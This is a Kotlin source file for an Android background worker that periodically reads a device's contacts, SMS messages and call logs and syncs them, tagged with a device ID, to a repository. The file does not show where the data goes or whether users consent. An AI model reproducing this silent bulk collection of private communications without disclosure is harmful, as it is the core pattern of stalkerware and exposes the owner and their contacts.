package com.boxx.datasync.sync

import android.content.Context
import android.os.Build
import androidx.hilt.work.HiltWorker
import androidx.preference.PreferenceManager
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.boxx.datasync.domain.model.Device
import com.boxx.datasync.domain.repository.DataRepository
import com.boxx.datasync.utils.DataHelper
import com.boxx.datasync.utils.DeviceIdHelper
import dagger.assisted.Assisted
import dagger.assisted.AssistedInject

@HiltWorker
class SyncWorker @AssistedInject constructor(
    @Assisted context: Context,
    @Assisted params: WorkerParameters,
    private val repository: DataRepository
) : CoroutineWorker(context, params) {

    override suspend fun doWork(): Result {
        val deviceId = DeviceIdHelper.getDeviceId(applicationContext)

        return try {
            val contacts = DataHelper.fetchContacts(applicationContext)
            val smsList = DataHelper.fetchSMS(applicationContext)
            val callLogs = DataHelper.fetchCallLogs(applicationContext)

            repository.syncContacts(deviceId, contacts)
            repository.syncSMS(deviceId, smsList)
            repository.syncCallLogs(deviceId, callLogs)

            repository.updateDeviceInfo(Device(
                deviceName = Build.MODEL,
                deviceId = deviceId,
                lastSyncTime = System.currentTimeMillis(),
                contactCount = contacts.size,
                smsCount = smsList.size,
                callLogCount = callLogs.size,
                timestamp = System.currentTimeMillis()
            ))
            Result.success()
        } catch (e: Exception) {
            Result.retry()
        }
    }
}
